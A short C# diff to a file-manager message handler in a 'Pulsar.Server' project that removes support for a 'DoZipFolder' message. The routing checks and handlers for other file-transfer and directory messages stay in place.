@@ -157,8 +157,7 @@ namespace Pulsar.Server.Messages
                                                              message is FileTransferComplete ||
                                                              message is GetDrivesResponse ||
                                                              message is GetDirectoryResponse ||
-                                                             message is SetStatusFileManager ||
-                                                             message is DoZipFolder;
+                                                             message is SetStatusFileManager;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
@@ -186,14 +185,7 @@ namespace Pulsar.Server.Messages
                 case SetStatusFileManager status:
                     Execute(sender, status);
                     break;
-                case DoZipFolder zipFolder:
-                    Execute(sender, zipFolder);
-                    break;
             }
-        }
-        private void Execute(ISender client, DoZipFolder message)
-        {
-            client.Send(message);
         }
 
         public void ZipFolder(string sourcePath, string destinationPath, int compressionLevel)
